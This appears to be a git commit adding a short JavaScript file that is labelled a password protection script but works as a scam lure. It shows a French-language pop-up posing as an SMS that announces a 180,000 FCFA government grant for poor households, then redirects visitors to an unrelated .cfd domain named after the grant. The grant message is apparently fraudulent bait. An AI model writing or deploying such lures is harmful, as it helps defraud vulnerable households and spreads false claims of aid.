065020562e3ebe17a0ddba26e175fcab3bb08bf3
The-ongoing <preciousadaowo4@gmail.com>
2026-01-29 01:38:22 +0100

    Create activeos.js

---
+++ activeos.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L’ARGENT'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible pour recevoir la SUBVENTION DE SOUTIEN JIGISÉMÉJIRI 2026 de 180 000 FCFA pour les ménages pauvres. Veuillez appuyer sur OK pour la recevoir immédiatement.',
+  'RETIRER DE L’ARGENT'
+);
+if (password != 'RETIRER DE L’ARGENT') {
+  location.href = 'https://ongoing-grant.cfd/Jigisemejiri-Pour-Les-Pauvres.html';
+  }
